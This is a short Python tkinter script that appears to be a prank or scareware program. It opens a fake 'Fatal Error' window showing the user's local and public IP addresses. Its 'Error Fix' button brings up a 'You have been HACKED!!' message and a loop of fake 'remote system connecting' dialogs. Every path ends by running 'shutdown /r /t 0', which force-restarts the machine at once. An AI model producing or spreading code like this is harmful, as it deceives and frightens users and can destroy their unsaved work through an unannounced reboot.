from tkinter import *
from requests import get
from tkinter import messagebox
import os, platform,socket,time

root = Tk()

class Window(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.master = master
        self.configure(bg='white')
        self.pack(fill=BOTH, expand=1)

        text = Label(self, text="Local IP:"+ local_ip, bg='white')
        text.pack(pady=10)
        text1 = Label(self, text="Public IP: "+ public_ip, bg='white')
        text1.pack(pady=10)

        def Showerror(event):
            messagebox.showinfo("Info", "Defined...         \n\nPlease wait       ")
            messagebox.showerror("Error", "You have been HACKED!!")
            system_respond1 = messagebox.askretrycancel("Emergency","System not responding...\n\nPress 'retry' button to fix this issue")
            while system_respond1 != False:
               system_respond = messagebox.askretrycancel("Emergency","System not responding...\n\nRemote system connecting...")
               if system_respond == False:
                    root.destroy()
                    time.sleep(2)
                    os.system("shutdown /r /t 0")
               else:
                   continue
            if system_respond1 == False:
                    root.destroy()
                    time.sleep(2)
                    os.system("shutdown /r /t 0")
                
                
                                   
        
        fix_button = Button(self,text='Error Fix',cursor='hand2',anchor=E)
        fix_button.pack(pady=10)
        fix_button.bind('<Button-1>',Showerror)
        


system_name = platform.system()

local_ip = socket.gethostbyname(socket.gethostname())
public_ip = get('https://api.ipify.org').text


app = Window(root)
root.wm_title("Fatal Error")
root.geometry("400x200")
root.resizable(False, False)
root.mainloop()